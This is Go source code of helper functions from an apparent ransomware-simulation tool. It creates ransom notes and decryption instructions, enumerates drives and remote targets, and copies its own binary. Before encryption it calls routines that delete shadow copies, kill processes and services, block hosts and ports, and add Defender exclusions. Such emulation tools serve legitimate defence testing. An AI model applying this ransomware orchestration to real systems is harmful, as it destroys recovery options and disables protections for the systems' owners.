package main

import (
	"bufio"
	r "crypto/rand"
	"fmt"
	"gopkg.in/yaml.v3"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"sync"
	"time"
)

// printFormattedMessage - a psuedo-logging mechanism since I didn't want to deploy zerolog for whatever reason
func printFormattedMessage(msg string, level LogLevel) {
	ts := time.Now().Format("2006-01-02T15:04:05.000Z")
	fmt.Printf("%s|%s| %s\n", ts, level, msg)
}

// generateDecryptInstructions - generates 'decryption_command.txt' when performing an encryption directive to assist in reversing the operation
func generateDecryptInstructions(targetDir string, privateKeyData AsymKeyHandler, cipher string, recurse bool, note string) {
	decryptionCommand := ""
	keyFile := ""
	if privateKeyData.System == "ecc" {
		if privateKeyData.ECCPrivateKeyFile == "" {
			keyFile = "ecc_key.ecc"
		} else {
			keyFile = privateKeyData.ECCPrivateKeyFile
		}
	} else if privateKeyData.System == "rsa" {
		if privateKeyData.RSAPrivateKeyFile == "" {
			keyFile = "rsa_key.rsa"
		} else {
			keyFile = privateKeyData.RSAPrivateKeyFile
		}
	}

	if privateKeyData.System == "ecc" {
		decryptionCommand = fmt.Sprintf("impact -directory \"%s\" -skipconfirm -ecc_private \"%s\" -cipher %s -decrypt -force_note_name %s", targetDir, keyFile, cipher, note)
	} else if privateKeyData.System == "rsa" {
		decryptionCommand = fmt.Sprintf("impact -directory \"%s\" -skipconfirm -rsa_private \"%s\" -cipher %s -decrypt -force_note_name %s", targetDir, keyFile, cipher, note)
	}
	if recurse {
		decryptionCommand += " -recursive"
	}
	f, err := os.Create("decryption_command.txt")
	defer f.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening decryption command file: %s", err.Error()), ERROR)
		return
	}
	f.WriteString(decryptionCommand)
}

// removeLastExtension - Removes the last extension from a filepath and returns the filepath without the extension
func removeLastExtension(filename string) string {
	ext := filepath.Ext(filename)
	if ext != "" {
		return strings.TrimSuffix(filename, ext)
	}
	return filename
}

// ReadConfig - Handles reading the embedded configuration file containing ransomware group metadata
func ReadConfig() (Config, error) {
	var tmp Config
	var data []byte
	var readerr error
	data, readerr = configFile.ReadFile("config.yaml")
	if readerr != nil {
		return tmp, readerr
	}
	err := yaml.Unmarshal(data, &tmp)
	if err != nil {
		return tmp, fmt.Errorf("YAML Unmarshal Error: %w", err)
	}
	return tmp, err
}

// doesOSEntryExist - basic wrapper
func doesOSEntryExist(dir string) bool {
	_, err := os.Stat(dir)
	if err != nil {
		// Makes some assumptions but this is the simplest approach
		return false
	}
	return true
}

// makeDirectory - basic wrapper
func makeDirectory(dir string) error {
	err := os.Mkdir(dir, os.ModeDir)
	if err != nil && !os.IsExist(err) {
		return err
	}
	return nil
}

// createNote - Used to create the specified ransomware note on disk
func createNote(note string, noteName string, destDir string) {
	f, _ := os.Create(filepath.Join(destDir, noteName))
	f.Write([]byte(note))
	f.Close()
}

// gatherFiles - Only used to identify top-level files in a directory when operating non-recursively
func gatherFiles(fileList []string, recursive bool, targetDir string) ([]string, error) {
	if !recursive {
		files, _ := os.ReadDir(targetDir)
		for _, v := range files {
			if v.IsDir() {
				continue
			}
			fileList = append(fileList, filepath.Join(targetDir, v.Name()))
		}
	} else {
		filepath.Walk(targetDir,
			func(path string, info os.FileInfo, err error) error {
				fileList = append(fileList, path)
				return nil
			})
	}
	return fileList, nil
}

func replaceExtensionVariables(extension string) string {
	var runes = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
	for true {
		if strings.Contains(extension, "%R") {
			extension = strings.Replace(extension, "%R", string(runes[rand.Intn(len(runes))]), 1)
		} else {
			break
		}
	}
	return extension
}

func preEncryptionChecks(args map[string]any, isAdmin bool, isRemoteDevice bool, config Config, decryptEnabled bool) {

	var err error
	// Delete VSS Copies
	if args["vss"].(bool) && isAdmin && !decryptEnabled {
		printFormattedMessage("Attempting to terminate VSS Copies", INFO)
		err = RemoveShadowCopies(isRemoteDevice)
		if err != nil {
			// Non-fatal so we will continue
			printFormattedMessage(fmt.Sprintf("VSS Removal Error: %s", err.Error()), ERROR)
		}
	}

	// Kill processes
	if args["killprocs"].(bool) && isAdmin && !decryptEnabled {
		printFormattedMessage("Attempting to terminate target processes", INFO)
		err = KillTargetProcesses(config.ProcessKillNames, isRemoteDevice, "")
		if err != nil {
			// Non-fatal so we will continue
			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
		}
	}

	if args["blockports"].(bool) && isAdmin {
		// Reversible
		handlePortBlocking(decryptEnabled, &config)
	}
	if args["blockhosts"].(bool) && isAdmin {
		// Reversible
		// Probably better way is resolve these to IPs and then block the IPs in-line
		// This is tricky - we don't really want to have to do this for all domains on all devices because that could be a huge spike in DNS traffic
		// But - should we really care about DNS performance/spikes in a ransomware simulation?
		// Plus - entries will probably be cached, so oh well
		handleDomainBlocking(decryptEnabled, &config)
	}
	if args["defender"].(bool) && isAdmin {
		// Non-Reversible
		handleDefenderExclusions(decryptEnabled)
	}
	if args["killservices"].(bool) && isAdmin && !decryptEnabled {
		stopServices(&config)
	}
}

func setupRegex(config Config) error {
	// Regex setup for file name-contains skips when doing encryption checks
	var err error
	regexString := ""
	for i, v := range config.FileNameExclusions {
		if i == 0 {
			regexString = fmt.Sprintf(".*%s.*", strings.ToLower(v))
		} else {
			regexString = fmt.Sprintf("%s|.*%s.*", regexString, strings.ToLower(v))
		}
	}
	fileNameSkipRegex, err = regexp.Compile(regexString)
	if err != nil {
		return err
	}
	return nil
}

func validateGroup(group RansomActor) error {
	validExtensionMethods := []string{"mutate", "append"}
	if !slices.Contains(validExtensionMethods, strings.ToLower(group.ExtensionMethod)) {
		return fmt.Errorf("Invalid Group Extension Method: %s", group.ExtensionMethod)
	}
	if len(group.Notes) == 0 {
		return fmt.Errorf("Invalid Group Note Names - 0 Length")
	}
	if len(group.Extensions) == 0 {
		return fmt.Errorf("Invalid Group Extensions - 0 Length")
	}

	validNoteBehaviors := []string{"immediate", "delayed"}
	if !slices.Contains(validNoteBehaviors, group.NoteBehavior) {
		return fmt.Errorf("Invalid Group Note Behavior: %s", group.NoteBehavior)
	}
	return nil
}

// CreateFiles - Handles the creation of dummy data inside the target directory
func CreateFiles(fileCount int, fileSize int, targetdir string) (error, []string) {
	printFormattedMessage(fmt.Sprintf("Creating Dummy Data inside directory: %s", targetdir), INFO)
	printFormattedMessage(fmt.Sprintf("Target Size: %d Megabytes", fileSize), INFO)
	printFormattedMessage(fmt.Sprintf("Target File Count: %d", fileCount), INFO)
	fileList := make([]string, 0)
	// Makes a random number of subdirectories followed by numbers and dates and distributes chunks of files into them
	validDirs := make([]string, 0)
	subdir_count := rand.Intn(20) + 3
	for i := 0; i < subdir_count; i++ {
		tmp := filepath.Join(targetdir, fmt.Sprintf("%s_%d_%d_%d", subdir_names[rand.Intn(len(subdir_names))], time.Now().Year(), rand.Intn(12), rand.Intn(60)))
		err := makeDirectory(tmp)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error Creating Directory: %s", err.Error()), ERROR)
			continue
		}
		validDirs = append(validDirs, tmp)
	}
	// Now we have a set of directories to load files into
	// We will distribute the files as evenly as possible between the directories
	targetFileSizeMegabytes := float64(fileSize) / float64(fileCount)
	targetFileSizeBytes := int(targetFileSizeMegabytes * (1 << 20))
	filesPerDirectory := fileCount / len(validDirs)
	var wg sync.WaitGroup
	for _, v := range validDirs {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := 0; i < filesPerDirectory; i++ {
				tmpFileName := fmt.Sprintf("%s_%s_%d_%d_%d.%s", file_names[rand.Intn(len(file_names))], subFileNames[rand.Intn(len(subFileNames))], rand.Intn(30), time.Now().Year(), rand.Intn(60), dummy_extensions[rand.Intn(len(dummy_extensions))])
				tmpFileFull := filepath.Join(v, tmpFileName)
				f, err := os.Create(tmpFileFull)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Error Creating File: %s", err.Error()), ERROR)
					continue
				}
				io.Copy(f, io.LimitReader(r.Reader, int64(targetFileSizeBytes)))
				fileList = append(fileList, tmpFileFull)
				f.Close()
			}
		}()
	}
	wg.Wait()
	return nil, fileList
}

func copySelf(destination string) error {
	sourcePath, err := os.Executable()
	if err != nil {
		return err
	}
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()
	destinationFile, err := os.Create(destination)
	if err != nil {
		return err
	}
	defer destinationFile.Close()
	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}
	return nil
}

func bitsToDrives(bitMap uint32) (drives []string) {
	availableDrives := []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
	for i := range availableDrives {
		if bitMap&1 == 1 {
			drives = append(drives, availableDrives[i])
		}
		bitMap >>= 1
	}
	return
}

func GetLogicalDriveLetters() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}
	return
}

func ListGroupMetadata(config Config) {
	printFormattedMessage(fmt.Sprintf(""), INFO)
	printFormattedMessage("Ransomware Group Details", INFO)
	for _, v := range config.Groups {
		printFormattedMessage(fmt.Sprintf("############"), INFO)
		printFormattedMessage(fmt.Sprintf("Group: %s", v.Group), INFO)
		printFormattedMessage(fmt.Sprintf("Extensions: %s", strings.Join(v.Extensions, ", ")), INFO)
		noteNames := make([]string, 0)
		for _, j := range v.Notes {
			noteNames = append(noteNames, j)
		}
		printFormattedMessage(fmt.Sprintf("Note Names: %s", strings.Join(noteNames, ", ")), INFO)
		printFormattedMessage(fmt.Sprintf("Cipher: %s", v.Cipher), INFO)
	}
}

func GetTargetList(args map[string]any) ([]string, error) {
	if args["targets_file"].(string) != "" {
		targets, err := readFileToSlice(args["targets_file"].(string))
		if err != nil {
			return nil, err
		} else {
			return targets, nil
		}
	} else if len(args["targets"].(StringSlice)) != 0 {
		targets := make([]string, 0)
		for _, v := range args["targets"].(StringSlice) {
			targets = append(targets, strings.TrimSpace(v))
		}
		return targets, nil
	} else {
		return nil, fmt.Errorf("No targets specified in targets_file or targets parameters")
	}
}

func readFileToSlice(file string) ([]string, error) {
	var tmp []string
	f, err := os.Open(file)
	if err != nil {
		return tmp, err
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		tmp = append(tmp, strings.TrimSpace(scanner.Text()))
	}
	return tmp, nil
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}
